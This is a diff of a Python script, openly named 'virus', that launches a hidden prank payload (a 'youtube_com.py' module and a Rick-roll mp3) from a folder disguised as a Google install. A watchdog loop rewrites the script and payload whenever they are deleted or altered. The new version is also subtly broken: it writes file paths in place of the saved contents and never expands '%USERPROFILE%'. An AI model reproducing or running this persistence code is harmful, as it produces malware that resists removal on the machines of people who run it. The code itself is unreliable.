@@ -1,34 +1,27 @@
-import os, time, sys
-import threading
-import importlib
-home_dir = os.path.expanduser("~")
-payload_path = f"{home_dir}\\Downloads\\Google_Stable_x64\\assets\\cache"
-sys.path.insert(1, payload_path)
+import os, time
+from multiprocessing import Process
 
-# annoying = importlib.import_module(os.path.join(payload_path, "youtube_com.py"))
-import youtube_com as annoying
+# Backup file, file to check
+files_to_backup = [
+  (__file__, __file__),
+  ("%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3", "%USERPROFILE%/Music/youtube_com-watch-dQw4w9WgXcQ.mp3")
+]
 
-chnapik_file = os.path.join(payload_path,"youtube_com-watch-dQw4w9WgXcQ.mp3")
-chnapik_file_content = open(chnapik_file, "rb").read()
-annoying_file = os.path.join(payload_path,"youtube_com.py")
-annoying_file_content = open(annoying_file, "r").read()
-virus = open(__file__, "r").read()
+backuped_files = [open(path, "r").read() for path, _ in files_to_backup]
 
-annoying_func_thread = threading.Thread(target=annoying.start)
-annoying_func_thread.start()
+virus_path = "%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
+
+start_virus = lambda: os.system(f"python {virus_path}")
+virus_thread = Process(target=start_virus)
+virus_thread.start()
+
 
 while True:
-  if (not os.path.exists(__file__)) or open(__file__, "r").read() != virus:
-    with open(__file__, "w") as file:
-      file.write(virus)
+  for index, file_paths in enumerate(files_to_backup):
+    backup = backuped_files[index]
+    for path in file_paths:
+      if not os.path.exists(path) or open(path, "r").read() != backup:
+        with open(path, "w") as file:
+          file.write(path)
+  time.sleep(1)
 
-  if (not os.path.exists(annoying_file)) or open(annoying_file, "r").read() != annoying_file_content:
-    with open(annoying_file, "w") as file:
-      file.write(annoying_file_content)
-      
-  if (not os.path.exists(chnapik_file)) or open(chnapik_file, "rb").read() != chnapik_file_content:
-    with open(chnapik_file, "wb") as file:
-      file.write(chnapik_file_content)
-
-
-  time.sleep(10)
